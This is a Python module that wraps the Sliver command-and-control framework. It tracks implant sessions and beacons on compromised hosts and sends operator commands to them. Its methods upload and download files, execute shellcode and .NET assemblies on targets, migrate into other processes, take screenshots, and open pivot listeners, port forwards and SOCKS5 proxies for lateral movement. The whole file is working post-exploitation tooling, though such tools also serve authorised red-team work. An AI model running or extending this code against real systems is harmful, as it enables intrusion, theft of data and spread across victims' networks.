"""
Sliver Session Handler
Manages active sessions and beacons
"""

import os
import json
import threading
from typing import Dict, List, Optional, Tuple, Callable
from dataclasses import dataclass, field
from datetime import datetime
from queue import Queue
import logging

from .sliver_manager import SliverServerManager

logger = logging.getLogger(__name__)


@dataclass
class SessionInfo:
    """Information about an active session"""
    session_id: str
    name: str
    remote_address: str
    hostname: str
    username: str
    uid: str
    gid: str
    os: str
    arch: str
    pid: int
    implant_id: str
    active_c2: str
    last_checkin: datetime
    is_beacon: bool = False
    
    def to_dict(self) -> Dict:
        return {
            "session_id": self.session_id,
            "name": self.name,
            "remote_address": self.remote_address,
            "hostname": self.hostname,
            "username": self.username,
            "uid": self.uid,
            "gid": self.gid,
            "os": self.os,
            "arch": self.arch,
            "pid": self.pid,
            "implant_id": self.implant_id,
            "active_c2": self.active_c2,
            "last_checkin": self.last_checkin.isoformat(),
            "is_beacon": self.is_beacon
        }


@dataclass
class CommandResult:
    """Result of a command execution"""
    session_id: str
    command: str
    output: str
    error: str
    success: bool
    executed_at: datetime
    
    def to_dict(self) -> Dict:
        return {
            "session_id": self.session_id,
            "command": self.command,
            "output": self.output,
            "error": self.error,
            "success": self.success,
            "executed_at": self.executed_at.isoformat()
        }


class SessionHandler:
    """Handles Sliver sessions and beacons"""
    
    def __init__(self, server_manager: SliverServerManager):
        self.server_manager = server_manager
        self.sessions: Dict[str, SessionInfo] = {}
        self.command_queue: Queue = Queue()
        self.result_queue: Queue = Queue()
        self.callbacks: Dict[str, List[Callable]] = {
            "new_session": [],
            "session_closed": [],
            "command_result": []
        }
        self.monitoring_thread = None
        self.monitoring = False
        
    def start_monitoring(self):
        """Start monitoring for new sessions"""
        if not self.monitoring:
            self.monitoring = True
            self.monitoring_thread = threading.Thread(target=self._monitor_sessions)
            self.monitoring_thread.daemon = True
            self.monitoring_thread.start()
            logger.info("Started session monitoring")
            
    def stop_monitoring(self):
        """Stop monitoring sessions"""
        self.monitoring = False
        if self.monitoring_thread:
            self.monitoring_thread.join()
        logger.info("Stopped session monitoring")
        
    def _monitor_sessions(self):
        """Monitor for new sessions and beacons"""
        while self.monitoring:
            try:
                # Check for new sessions
                success, sessions = self.server_manager.list_sessions()
                if success:
                    self._update_sessions(sessions, is_beacon=False)
                    
                # Check for new beacons
                success, beacons = self.server_manager.list_beacons()
                if success:
                    self._update_sessions(beacons, is_beacon=True)
                    
                # Process command queue
                self._process_command_queue()
                
                # Sleep before next check
                import time
                time.sleep(5)
                
            except Exception as e:
                logger.error(f"Error monitoring sessions: {e}")
                
    def _update_sessions(self, session_list: List[Dict], is_beacon: bool = False):
        """Update internal session list"""
        current_ids = set()
        
        for session_data in session_list:
            session_id = session_data.get("ID", session_data.get("id"))
            current_ids.add(session_id)
            
            if session_id not in self.sessions:
                # New session
                session_info = SessionInfo(
                    session_id=session_id,
                    name=session_data.get("Name", ""),
                    remote_address=session_data.get("RemoteAddress", ""),
                    hostname=session_data.get("Hostname", ""),
                    username=session_data.get("Username", ""),
                    uid=session_data.get("UID", ""),
                    gid=session_data.get("GID", ""),
                    os=session_data.get("OS", ""),
                    arch=session_data.get("Arch", ""),
                    pid=session_data.get("PID", 0),
                    implant_id=session_data.get("ImplantID", ""),
                    active_c2=session_data.get("ActiveC2", ""),
                    last_checkin=datetime.fromisoformat(session_data.get("LastCheckin", datetime.now().isoformat())),
                    is_beacon=is_beacon
                )
                
                self.sessions[session_id] = session_info
                self._trigger_callbacks("new_session", session_info)
                logger.info(f"New {'beacon' if is_beacon else 'session'}: {session_id}")
            else:
                # Update existing session
                self.sessions[session_id].last_checkin = datetime.now()
                
        # Check for closed sessions
        for session_id in list(self.sessions.keys()):
            if session_id not in current_ids:
                closed_session = self.sessions.pop(session_id)
                self._trigger_callbacks("session_closed", closed_session)
                logger.info(f"Session closed: {session_id}")
                
    def _process_command_queue(self):
        """Process queued commands"""
        while not self.command_queue.empty():
            try:
                session_id, command, args = self.command_queue.get_nowait()
                success, output = self.server_manager.execute_sliver_command(
                    session_id, command, args
                )
                
                result = CommandResult(
                    session_id=session_id,
                    command=f"{command} {' '.join(args) if args else ''}",
                    output=output if success else "",
                    error="" if success else output,
                    success=success,
                    executed_at=datetime.now()
                )
                
                self.result_queue.put(result)
                self._trigger_callbacks("command_result", result)
                
            except Exception as e:
                logger.error(f"Error processing command: {e}")
                
    def execute_command(self, session_id: str, command: str, args: List[str] = None) -> bool:
        """Queue a command for execution"""
        if session_id not in self.sessions:
            logger.error(f"Session {session_id} not found")
            return False
            
        self.command_queue.put((session_id, command, args or []))
        return True
        
    def execute_command_sync(self, session_id: str, command: str, args: List[str] = None) -> CommandResult:
        """Execute command synchronously"""
        if session_id not in self.sessions:
            return CommandResult(
                session_id=session_id,
                command=command,
                output="",
                error="Session not found",
                success=False,
                executed_at=datetime.now()
            )
            
        success, output = self.server_manager.execute_sliver_command(
            session_id, command, args
        )
        
        return CommandResult(
            session_id=session_id,
            command=f"{command} {' '.join(args) if args else ''}",
            output=output if success else "",
            error="" if success else output,
            success=success,
            executed_at=datetime.now()
        )
        
    def get_session(self, session_id: str) -> Optional[SessionInfo]:
        """Get session information"""
        return self.sessions.get(session_id)
        
    def list_sessions(self) -> List[SessionInfo]:
        """List all active sessions"""
        return list(self.sessions.values())
        
    def register_callback(self, event: str, callback: Callable):
        """Register event callback"""
        if event in self.callbacks:
            self.callbacks[event].append(callback)
            
    def _trigger_callbacks(self, event: str, data):
        """Trigger registered callbacks"""
        for callback in self.callbacks.get(event, []):
            try:
                callback(data)
            except Exception as e:
                logger.error(f"Error in callback: {e}")
                
    def interact_with_session(self, session_id: str) -> Tuple[bool, str]:
        """Start interactive session"""
        if session_id not in self.sessions:
            return False, "Session not found"
            
        success, output = self.server_manager.use_session(session_id)
        return success, output
        
    def upload_file(self, session_id: str, local_path: str, remote_path: str) -> CommandResult:
        """Upload file to target"""
        return self.execute_command_sync(
            session_id,
            "upload",
            [local_path, remote_path]
        )
        
    def download_file(self, session_id: str, remote_path: str, local_path: str) -> CommandResult:
        """Download file from target"""
        return self.execute_command_sync(
            session_id,
            "download",
            [remote_path, local_path]
        )
        
    def execute_shellcode(self, session_id: str, shellcode_path: str) -> CommandResult:
        """Execute shellcode on target"""
        return self.execute_command_sync(
            session_id,
            "execute-shellcode",
            [shellcode_path]
        )
        
    def execute_assembly(self, session_id: str, assembly_path: str, args: List[str] = None) -> CommandResult:
        """Execute .NET assembly on target"""
        cmd_args = [assembly_path]
        if args:
            cmd_args.extend(args)
            
        return self.execute_command_sync(
            session_id,
            "execute-assembly",
            cmd_args
        )
        
    def migrate_process(self, session_id: str, pid: int) -> CommandResult:
        """Migrate to another process"""
        return self.execute_command_sync(
            session_id,
            "migrate",
            [str(pid)]
        )
        
    def get_processes(self, session_id: str) -> CommandResult:
        """List processes on target"""
        return self.execute_command_sync(session_id, "ps")
        
    def get_network_connections(self, session_id: str) -> CommandResult:
        """Get network connections"""
        return self.execute_command_sync(session_id, "netstat")
        
    def screenshot(self, session_id: str) -> CommandResult:
        """Take screenshot"""
        return self.execute_command_sync(session_id, "screenshot")
        
    def pivot_listener(self, session_id: str, bind_address: str, bind_port: int) -> CommandResult:
        """Create pivot listener"""
        return self.execute_command_sync(
            session_id,
            "pivots",
            ["tcp", bind_address, str(bind_port)]
        )
        
    def portforward(self, session_id: str, local_port: int, remote_host: str, remote_port: int) -> CommandResult:
        """Create port forward"""
        return self.execute_command_sync(
            session_id,
            "portfwd",
            ["add", str(local_port), remote_host, str(remote_port)]
        )
        
    def socks5_proxy(self, session_id: str, bind_port: int) -> CommandResult:
        """Start SOCKS5 proxy"""
        return self.execute_command_sync(
            session_id,
            "socks5",
            ["start", str(bind_port)]
        )